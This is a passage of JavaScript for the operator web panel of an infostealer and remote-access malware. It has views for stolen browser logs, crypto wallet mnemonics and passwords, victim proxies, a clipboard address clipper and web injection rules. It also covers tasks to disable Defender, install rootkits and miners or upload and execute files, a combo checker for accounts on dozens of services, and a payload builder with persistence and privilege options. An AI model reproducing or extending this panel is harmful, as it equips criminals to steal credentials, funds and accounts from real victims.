    const label = el('label', {}, [f.label]);
    let input;
    if (f.type === 'textarea') input = el('textarea');
    else if (f.type === 'select') { input = el('select'); f.options.forEach(o => input.appendChild(el('option', { value: o }, [o]))); }
    else input = el('input', { type: f.type || 'text', placeholder: f.placeholder || '' });
    input.dataset.field = f.key;
    label.appendChild(input);
    return label;
  });
  const foot = el('div', { className: 'modal-foot' });
  const cancel = el('button', { className: 'btn' }, [t('cancel')]);
  cancel.onclick = closeModal;
  const save = el('button', { className: 'btn primary' }, [t('save')]);
  save.onclick = async () => {
    const body = {};
    nodes.forEach(label => {
      const i = label.querySelector('[data-field]');
      if (i) body[i.dataset.field] = i.value;
    });
    await api('/api/' + view, { method: 'POST', body: JSON.stringify(body) });
    closeModal();
    loadCollection(view);
    toast(t('added'));
  };
  foot.appendChild(cancel);
  foot.appendChild(save);
  nodes.push(foot);
  openModal(title, nodes);
}

function addRowModalInline(fields, title, onSave) {
  const nodes = fields.map(f => {
    const label = el('label', {}, [f.label]);
    const input = el('input', { type: f.type || 'text', placeholder: f.placeholder || '' });
    input.dataset.field = f.key;
    label.appendChild(input);
    return label;
  });
  const foot = el('div', { className: 'modal-foot' });
  const cancel = el('button', { className: 'btn' }, [t('cancel')]);
  cancel.onclick = closeModal;
  const save = el('button', { className: 'btn primary' }, [t('save')]);
  save.onclick = () => {
    const body = {};
    nodes.forEach(label => {
      const i = label.querySelector('[data-field]');
      if (i) body[i.dataset.field] = i.value;
    });
    onSave(body);
    closeModal();
  };
  foot.appendChild(cancel);
  foot.appendChild(save);
  nodes.push(foot);
  openModal(title, nodes);
}

/* ============ Views ============ */
const views = {
  home: (root) => { root.appendChild(el('div', { className: 'empty' }, ['Home — summary coming soon.'])); },
  dashboard: (root) => { root.appendChild(el('div', { className: 'empty' }, ['Dashboard — metrics coming soon.'])); },
  clients: renderClients,

  recovery: (root) => {
    loadCollection('recovery');
    collectionView('recovery', root, [
      { label: 'Received', render: r => esc(r.createdAt || '') },
      { label: 'IP', key: 'ip' }, { label: 'Country', key: 'country' },
      { label: 'User', key: 'user' }, { label: 'Machine', key: 'machine' },
      { label: 'OS', key: 'os' }, { label: 'Tag', key: 'tag' },
      { label: 'Contents', render: r => esc((r.contents || '').slice(0, 60)) }
    ], {
      searchPlaceholder: 'Search recovery logs...',
      stats: (c) => [
        { label: t('totalLogs'), value: c.length, pill: '0 | 0.0%' },
        { label: t('cookies'), value: 0, pill: '0 | 0.0%' },
        { label: t('passwords'), value: 0, pill: '0 | 0.0%' },
        { label: t('cards'), value: 0, pill: '0 | 0.0%' },
        { label: t('applications'), value: 0, pill: '0 | 0.0%' }
      ],
      addLabel: t('addLog'),
      onAdd: () => addRowModal('recovery', [
        { key: 'ip', label: 'IP' }, { key: 'country', label: 'Country' },
        { key: 'user', label: 'User' }, { key: 'machine', label: 'Machine' },
        { key: 'os', label: 'OS' }, { key: 'tag', label: 'Tag' },
        { key: 'contents', label: 'Contents', type: 'textarea' }
      ], t('addLog'))
    });
  },

  wallets: (root) => {
    loadCollection('wallets');
    collectionView('wallets', root, [
      { label: 'Received', render: r => esc(r.createdAt || '') },
      { label: 'Wallet', key: 'wallet' }, { label: 'Password', key: 'password' },
      { label: 'Mnemonic', render: r => esc((r.mnemonic || '').slice(0, 40)) },
      { label: 'IP', key: 'ip' }, { label: 'Country', key: 'country' },
      { label: 'User', key: 'user' }, { label: 'Machine', key: 'machine' }, { label: 'OS', key: 'os' }
    ], {
      searchPlaceholder: 'Search wallet logs...',
      stats: (c) => [
        { label: t('totalLogs'), value: c.length, pill: '0.0%' },
        { label: t('atomic'), value: 0, pill: '0.0%' },
        { label: t('exodus'), value: 0, pill: '0.0%' },
        { label: t('phantom'), value: 0, pill: '0.0%' },
        { label: t('metamask'), value: 0, pill: '0.0%' },
        { label: t('trustWallet'), value: 0, pill: '0.0%' }
      ],
      addLabel: t('addWallet'),
      onAdd: () => addRowModal('wallets', [
        { key: 'wallet', label: 'Wallet' }, { key: 'password', label: 'Password' },
        { key: 'mnemonic', label: 'Mnemonic', type: 'textarea' }, { key: 'ip', label: 'IP' },
        { key: 'country', label: 'Country' }, { key: 'user', label: 'User' },
        { key: 'machine', label: 'Machine' }, { key: 'os', label: 'OS' }
      ], t('addWallet'))
    });
  },

  proxy: (root) => {
    loadCollection('proxy');
    collectionView('proxy', root, [
      { label: 'IP', key: 'ip' }, { label: 'Country', key: 'country' },
      { label: 'Username', key: 'username' }, { label: 'Machine', key: 'machine' },
      { label: 'Status', key: 'status' }, { label: 'Proxy Host', key: 'host' },
      { label: 'Port', key: 'port' }, { label: 'Hwid', key: 'hwid' }
    ], {
      searchPlaceholder: 'Search proxies...',
      stats: (c) => [
        { label: t('onlineProxies'), value: c.filter(p => p.status === 'Active').length, pill: 'Idle' },
        { label: t('offlineProxies'), value: c.filter(p => p.status !== 'Active').length, pill: 'None' },
        { label: t('totalProxies'), value: c.length, pill: 'Empty' },
        { label: t('workers'), value: 0, pill: 'No owners' }
      ],
      addLabel: t('addProxy'),
      onAdd: () => addRowModal('proxy', [
        { key: 'ip', label: 'IP' }, { key: 'port', label: 'Port' },
        { key: 'country', label: 'Country' }, { key: 'username', label: 'Username' },
        { key: 'host', label: 'Proxy Host' },
        { key: 'status', label: 'Status', type: 'select', options: ['Idle', 'Active', 'Dead'] }
      ], t('addProxy'))
    });
  },

  clipper: async (root) => {
    const cfg = await api('/api/clipper');
    root.innerHTML = '';
    const bar = el('div', { className: 'toolbar' });
    const add = el('button', { className: 'btn primary' }, ['Add Entry']);
    add.onclick = () => addRowModalInline([
      { key: 'label', label: 'Label' }, { key: 'find', label: 'Match (regex)' }, { key: 'replace', label: 'Replacement' }
    ], 'Add Clipper Entry', (body) => {
      cfg.entries.push({ id: Date.now().toString(36), ...body });
      api('/api/clipper', { method: 'POST', body: JSON.stringify(cfg) });
      views.clipper(root);
    });
    bar.appendChild(add);
    bar.appendChild(el('div', { className: 'spacer' }));
    const toggle = el('label', { className: 'switch' });
    const cb = el('input', { type: 'checkbox' });
    cb.checked = !!cfg.enabled;
    cb.onchange = () => { cfg.enabled = cb.checked; api('/api/clipper', { method: 'POST', body: JSON.stringify(cfg) }); };
    toggle.appendChild(cb);
    toggle.appendChild(el('span', { className: 'slider' }));
    bar.appendChild(toggle);
    root.appendChild(bar);
    root.appendChild(dataTable(
      [{ label: 'Label', key: 'label' }, { label: 'Match', key: 'find' }, { label: 'Replace', key: 'replace' }],
      cfg.entries, { checkbox: true, emptyText: 'No clipper entries.' }
    ));
  },

  webinjection: (root) => {
    loadCollection('webinjection');
    collectionView('webinjection', root, [
      { label: 'Rule', key: 'name' }, { label: 'URL Pattern', key: 'url' },
      { label: 'Enabled', render: r => r.enabled ? '✓' : '✗' },
      { label: 'Replacement', render: r => esc((r.replacement || '').slice(0, 40)) }
    ], {
      searchPlaceholder: 'Search rules...',
      addLabel: t('addRule'),
      onAdd: () => addRowModal('webinjection', [
        { key: 'name', label: 'Rule Name' }, { key: 'url', label: 'URL Pattern' },
        { key: 'original', label: 'Original Code', type: 'textarea' },
        { key: 'replacement', label: 'Replacement Code', type: 'textarea' }
      ], t('addRule'))
    });
  },

  sorter: (root) => {
    loadCollection('sorter');
    root.innerHTML = '';
    const bar = el('div', { className: 'toolbar' });
    const add = el('button', { className: 'btn primary' }, [t('addGroup')]);
    add.onclick = () => addRowModal('sorter', [
      { key: 'name', label: 'Group Name' },
      { key: 'type', label: 'Type', type: 'select', options: ['Cookies','Passwords','Folders','Discord Tokens','Steam Tokens','Telegram Data'] },
      { key: 'filter', label: 'Filter' },
      { key: 'format', label: 'Format', type: 'select', options: ['Netscape','JSON'] }
    ], t('addGroup'));
    bar.appendChild(add);
    bar.appendChild(el('div', { className: 'spacer' }));
    root.appendChild(bar);
    root.appendChild(dataTable(
      [{ label: 'Name', key: 'name' }, { label: 'Type', key: 'type' }, { label: 'Filter', key: 'filter' }, { label: 'Format', key: 'format' }],
      caches.sorter, { checkbox: true, emptyText: 'No sorter groups.' }
    ));
  },

  autotasks: (root) => {
    loadCollection('autotasks');
    root.innerHTML = '';
    const row = el('div', { className: 'stat-row' });
    row.appendChild(statCard(t('totalTasks'), caches.autotasks.length, 'Empty'));
    row.appendChild(statCard(t('active'), 0, 'Idle'));
    row.appendChild(statCard(t('onceTasks'), 0, 'None'));
    row.appendChild(statCard(t('executions'), 0, 'No runs'));
    root.appendChild(row);
    const bar = el('div', { className: 'toolbar' });
    const add = el('button', { className: 'btn primary' }, [t('addTask')]);
    add.onclick = () => addRowModal('autotasks', [
      { key: 'name', label: 'Task Name' },
      { key: 'type', label: 'Type', type: 'select', options: ['Recovery','Cryptocurrency Injection','Miner','Clipper','Web Injection','Upload and Execute','Disable Defender','Elevate','Rootkit'] },
      { key: 'mode', label: 'When', type: 'select', options: ['Every connect','Once','Delay'] }
    ], t('addTask'));
    bar.appendChild(add);
    bar.appendChild(el('div', { className: 'spacer' }));
    root.appendChild(bar);
    const chain = el('div', { className: 'chain' });
    const trigger = el('div', { className: 'chain-node' });
    trigger.style.left = '60px'; trigger.style.top = '90px';
    trigger.appendChild(el('div', { className: 'cn-title' }, ['TRIGGER']));
    trigger.appendChild(el('div', { className: 'cn-sub' }, ['On connect']));
    trigger.appendChild(el('div', { className: 'cn-sub' }, [caches.autotasks.length + ' in chain']));
    chain.appendChild(trigger);
    root.appendChild(chain);
    root.appendChild(dataTable(
      [
        { label: 'Name', key: 'name' }, { label: 'Type', key: 'type' }, { label: 'Mode', key: 'mode' },
        { label: 'Status', render: () => '<span style="color:var(--ok)">Enabled</span>' },
        { label: 'Detail', render: () => '—' }, { label: 'Fired', render: () => '—' }
      ],
      caches.autotasks, { checkbox: true, emptyText: 'No tasks.' }
    ));
  },

  filestore: (root) => {
    loadCollection('filestore');
    collectionView('filestore', root, [
      { label: 'Name', key: 'name' }, { label: 'Size', key: 'size' },
      { label: 'Uploaded', render: r => esc(r.createdAt || '') }
    ], {
      searchPlaceholder: 'Search files...',
      stats: (c) => [
        { label: t('totalFiles'), value: c.length, pill: 'Empty' },
        { label: t('totalSize'), value: c.reduce((a, x) => a + (parseInt(x.size) || 0), 0) + ' B', pill: 'No files' },
        { label: t('recent'), value: 0, pill: 'None' }
      ],
      addLabel: t('upload'),
      onAdd: () => addRowModal('filestore', [
        { key: 'name', label: 'Name' }, { key: 'size', label: 'Size' }
      ], t('upload'))
    });
  },

  miner: async (root) => {
    const m = await api('/api/miner');
    root.innerHTML = '';
    const row = el('div', { className: 'stat-row' });
    [
      [t('activeMiners'), m.stats.active, '0%'],
      [t('totalHashrate'), m.stats.hashrate + ' H/s', 'No miners'],
      [t('cpuHashrate'), '0 H/s', 'Idle'],
      [t('gpuHashrate'), '0 H/s', 'Idle'],
      [t('accepted'), m.stats.accepted, 'No shares'],
      [t('rejected'), m.stats.rejected, 'Clean'],
      [t('totalRuntime'), '0s', 'Idle']
    ].forEach(([l, v, p]) => row.appendChild(statCard(l, v, p)));
    root.appendChild(row);
    const bar = el('div', { className: 'toolbar' });
    const add = el('button', { className: 'btn primary' }, [t('addJob')]);
    add.onclick = () => addRowModalInline([
      { key: 'name', label: 'Job Name' }, { key: 'pool', label: 'Pool URL' }, { key: 'wallet', label: 'Wallet' }
    ], t('addJob'), (body) => {
      m.jobs.push({ id: Date.now().toString(36), ...body });
      api('/api/miner', { method: 'POST', body: JSON.stringify(m) });
      views.miner(root);
    });
    bar.appendChild(add);
    bar.appendChild(el('div', { className: 'spacer' }));
    root.appendChild(bar);
    root.appendChild(dataTable(
      [{ label: 'User', key: 'name' }, { label: 'Machine', key: 'pool' }, { label: 'Wallet', key: 'wallet' }, { label: 'Status', render: () => 'Idle' }],
      m.jobs, { checkbox: true, emptyText: 'No mining jobs.' }
    ));
  },

  checker: (root) => {
    root.innerHTML = '';
    const cats = ['All','Games','Emails','Socials','Marketplaces','Crypto','AI','Streaming','Other'];
    const catBar = el('div', { className: 'checker-cats' });
    cats.forEach((cat, i) => {
      const b = el('button', { className: i === 0 ? 'active' : '' }, [cat]);
      b.onclick = () => { catBar.querySelectorAll('button').forEach(x => x.classList.remove('active')); b.classList.add('active'); };
      catBar.appendChild(b);
    });
    root.appendChild(catBar);
    const search = searchBar('Search', () => {});
    root.appendChild(search.bar);
    const services = [
      ['Amazon','Email, Country, Balance, Orders','#ff9900'],
      ['AOL Mail','Username, Email, Phone, Country','#0060a9'],
      ['Avito','Email, Phone, Name, Balance','#00a1ff'],
      ['BattleNet','Email, Balance, Transactions','#148eff'],
      ['Binance','ID, Email, Country, Balance','#f0b90b'],
      ['Booking','Email, Country, Level, Payments','#003580'],
      ['Bybit','ID, Email, Country, Balance','#f7a600'],
      ['ChatGPT','Email, Name, Plan, 2FA','#10a37f'],
      ['Claude','Email, Plan, Billing, Expires At','#d97757'],
      ['Coinbase','Email, Country, Balance, 2FA','#1652f0'],
      ['Cursor','Email, Name, Plan, Usage','#111827'],
      ['Discord','Username, Email, Nitro, Guilds','#5865f2'],
      ['Dropbox','Email, Name, Plan, Storage Used','#0061ff'],
      ['EA','Username, Email, Country, Created At','#ff4747'],
      ['eBay','Username, Country, Orders, Feedback','#e53238'],
      ['EFT','Username, Email, Owned, Banned','#111'],
      ['Epic Games','Username, Email, Country, V-Bucks, Skins','#2a2a2a'],
      ['EXBO','Username, Email, Game, Inventory','#1e3a8a'],
      ['ExitLag','Email, Plan, Status','#d42028'],
      ['Facebook','Name, Friends, Verified, Business, Country, Locale','#1877f2'],
      ['FreeBitco.in','Email, BTC Address, Balance, 2FA','#f7931a'],
      ['FunPay','Username, Balance, Sales, Purchases','#ffce3d'],
      ['GitHub','Username, Email, Followers, Plan','#111827'],
      ['GOG.com','Username, Email, Balance, Games','#7b2eda'],
      ['Google','Name, Email, Country, 2FA','#4285f4'],
      ['Grok','Name, Email, Plan, Subscription','#111827'],
      ['Humble Bundle','Email, Country, Balance, Orders','#d63030'],
      ['Hytale','Username, Email, Purchased, Edition','#3b82f6'],
      ['iCloud','Email, Name, Plan, Storage','#3693f3'],
      ['Instagram','Username, Email, Followers, Verified','#e4405f'],
      ['Kick','Username, Email, Followers, Verified','#53fc18'],
      ['Kleinanzeigen','Username, Email, City, Listings','#111'],
      ['LinkedIn','Username, Email, Connections, Premium','#0a66c2'],
      ['Loaded','Name, Email, Country, Orders','#7c3aed'],
      ['MEXC','Email, Country, KYC, Balance','#00c9a7'],
      ['miHoYo','Username, Email, Country, Games','#5c9ee8'],
      ['Minecraft','Username, Email, Owned, Minecoins','#62b47a'],
      ['Netflix','Name, Email, Country, Plan','#e50914'],
      ['Nintendo','Email, Country, Balance, Orders','#e60012'],
      ['Onet','Email, Country, Phone, Quota','#ffcc00'],
      ['Outlook','Name, Email, Country, Inbox','#0078d4'],
      ['PayPal','Email, Country, Balance, Cards','#003087'],
      ['Playerok','Username, Email, Balance, Sales','#2563eb'],
      ['Reddit','Username, Karma, Premium, Verified','#ff4500'],
      ['Riot Games','Username, Email, Country, 2FA','#d13639'],
      ['Roblox','Username, Email, Country, Robux, Premium','#00a2ff'],
      ['Rockstar Games','Username, Email, Games','#f8b700'],
      ['Seznam','Email, Name, Phone, Country','#cc0000']
    ];
    const grid = el('div', { className: 'checker-grid' });
    services.forEach(([name, desc, color]) => {
      const card = el('div', { className: 'checker-card' });
      const head = el('div', { className: 'cc-head' });
      head.appendChild(el('div', { className: 'cc-logo', style: `background:${color}` }, [name[0]]));
      const open = el('button', { className: 'btn icon' });
      open.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M14 4h6v6M20 4l-9 9M5 5h5M5 19h14V10"/></svg>';
      head.appendChild(open);
      card.appendChild(head);
      card.appendChild(el('div', { className: 'cc-name' }, [name]));
      card.appendChild(el('div', { className: 'cc-desc' }, [desc]));
      const foot = el('div', { className: 'cc-foot' });
      const settings = el('button', { className: 'cc-settings' }, ['⚙ Settings']);
      settings.onclick = () => toast('Settings: ' + name);
      foot.appendChild(settings);
      const sw = el('label', { className: 'switch' });
      sw.appendChild(el('input', { type: 'checkbox' }));
      sw.appendChild(el('span', { className: 'slider' }));
      foot.appendChild(sw);
      card.appendChild(foot);
      grid.appendChild(card);
    });
    root.appendChild(grid);
  },

  checkersessions: (root) => {
    loadCollection('checkersessions');
    collectionView('checkersessions', root, [
      { label: 'Service', key: 'service' },
      { label: 'Combo', render: r => esc((r.combo || '').slice(0, 50)) },
      { label: 'Status', key: 'status' },
      { label: 'Checked', render: r => esc(r.createdAt || '') }
    ], {
      searchPlaceholder: 'Search sessions...',
      addLabel: t('addSession'),
      onAdd: () => addRowModal('checkersessions', [
        { key: 'service', label: 'Service' }, { key: 'combo', label: 'Combo (email:pass)' },
        { key: 'status', label: 'Status', type: 'select', options: ['Valid','Invalid','2FA','Locked'] }
      ], t('addSession'))
    });
  },

  builder: async (root) => {
    const b = await api('/api/builder');
    root.innerHTML = '';
    const save = () => api('/api/builder', { method: 'POST', body: JSON.stringify(b) });
    function sec(titleKey, rows) {
      const box = el('div', { className: 'sec' });
      const tt = el('div', { className: 'sec-title' }, [t(titleKey)]);
      tt.appendChild(el('span', { className: 'chev' }, ['⌄']));
      box.appendChild(tt);
      rows.forEach(row => {
        if (row.type === 'toggle') {
          const tr = el('div', { className: 'toggle-row' });
          const left = el('div');
          left.appendChild(el('div', { className: 'tr-label' }, [t(row.labelKey)]));
          if (row.subKey) left.appendChild(el('div', { className: 'tr-sub' }, [t(row.subKey)]));
          tr.appendChild(left);
          const sw = el('label', { className: 'switch' });
          const cb = el('input', { type: 'checkbox' });
          const path = row.path.split('.');
          let val = b; path.forEach(p => val = val?.[p]);
          cb.checked = !!val;
          cb.onchange = () => {
            let obj = b;
            for (let i = 0; i < path.length - 1; i++) obj = obj[path[i]];
            obj[path[path.length - 1]] = cb.checked;
            save();
          };
          sw.appendChild(cb);
          sw.appendChild(el('span', { className: 'slider' }));
          tr.appendChild(sw);
          box.appendChild(tr);
        } else {
          const fr = el('div', { className: 'form-row' });
          fr.appendChild(el('label', {}, [t(row.labelKey)]));
          const path = row.path.split('.');
          let val = b; path.forEach(p => val = val?.[p]);
          const input = el('input', { value: val ?? '', placeholder: row.placeholder || '' });
          input.onchange = () => {
            let obj = b;
            for (let i = 0; i < path.length - 1; i++) obj = obj[path[i]];
            obj[path[path.length - 1]] = input.value;
            save();
          };
          fr.appendChild(input);
          box.appendChild(fr);
        }
      });
      return box;
    }

    root.appendChild(sec('general', [
      { labelKey: 'clientTag', path: 'clientTag' },
      { labelKey: 'note', path: 'note' },
      { labelKey: 'mutex', path: 'mutex' }
    ]));
    root.appendChild(sec('options', [
      { labelKey: 'defenderExclusion', path: 'defenderExclusion', type: 'toggle' },
      { labelKey: 'forceAdmin', path: 'forceAdmin', type: 'toggle' },
      { labelKey: 'debug', path: 'debug', type: 'toggle' }
    ]));
    root.appendChild(sec('install', [
      { labelKey: 'enabled', path: 'install.enabled', type: 'toggle' },
      { labelKey: 'location', path: 'install.location' },
      { labelKey: 'folder', path: 'install.folder' },
      { labelKey: 'filename', path: 'install.filename' },
      { labelKey: 'registry', path: 'install.registry', type: 'toggle' }
    ]));

    const finalSec = el('div', { className: 'sec' });
    finalSec.appendChild(el('div', { className: 'sec-title' }, [t('final')]));
    const cr = el('div', { className: 'form-row' });
    cr.appendChild(el('label', {}, ['Client']));
    const sel = el('select');
    ['exe','dll','py','ps1'].forEach(o => sel.appendChild(el('option', { value: o }, [o])));
    sel.value = b.final.client;
    sel.onchange = () => { b.final.client = sel.value; save(); };
    cr.appendChild(sel);
    finalSec.appendChild(cr);

    const buildBtn = el('button', { className: 'btn primary', style: 'width:100%;padding:0.75rem' }, [t('buildClient')]);
    buildBtn.onclick = async () => {
      const build = await api('/api/builder/build', { method: 'POST', body: '{}' });
      toast(t('buildCreated') + ': ' + build.name);
      addNotification(t('clientBuilder'), t('buildCreated'), 'info');
      views.builder(root);
    };
    finalSec.appendChild(buildBtn);

    finalSec.appendChild(el('div', { style: 'margin-top:1rem;color:var(--text-mute);font-size:0.75rem' }, ['Archive password: 2478']));
    finalSec.appendChild(el('div', { style: 'margin-top:0.5rem;font-size:0.85rem;font-weight:600' }, [t('recentBuilds')]));
    b.builds.forEach(bd => {
      finalSec.appendChild(el('div', { style: 'padding:0.6rem 0;border-bottom:1px solid var(--border-soft);display:flex;justify-content:space-between;align-items:center' }, [
        el('div', {}, [
          el('div', { style: 'font-size:0.82rem' }, [bd.name]),
          el('div', { style: 'font-size:0.7rem;color:var(--text-mute)' }, [bd.createdAt + ' · ' + bd.size + ' · password ' + bd.password])
        ])
      ]));
    });
    root.appendChild(finalSec);
  }
};

socket.on('push', ({ collection: col, item }) => {
  if (caches[col]) {
    caches[col].push(item);
    if (collectionRerender[col]) collectionRerender[col]();
  }
});

/* ============ Wiring ============ */
$('modalClose').onclick = closeModal;
$('modal').onclick = (e) => { if (e.target === $('modal')) closeModal(); };
document.addEventListener('click', hideCtx);

$('notifBtn').onclick = (e) => { e.stopPropagation(); toggleNotifPanel(); };
$('notifClose').onclick = () => $('notifPanel').classList.add('hidden');
$('notifClear').onclick = () => { notifications.length = 0; renderNotifications(); };
$('themeBtn').onclick = (e) => { e.stopPropagation(); toggleThemePanel(); };
$('themeClose').onclick = () => $('themePanel').classList.add('hidden');
$('profileBtn').onclick = () => toast('Profile: ' + (operatorKey ? 'operator' : 'guest'));

document.querySelectorAll('#loginLangs button, #themeLangs button').forEach(b => {
  b.onclick = () => applyLang(b.dataset.lang);
});

/* ============ Boot ============ */
document.body.setAttribute('data-theme', currentTheme);
renderThemePanel();
applyLang(currentLang);
renderNotifications();
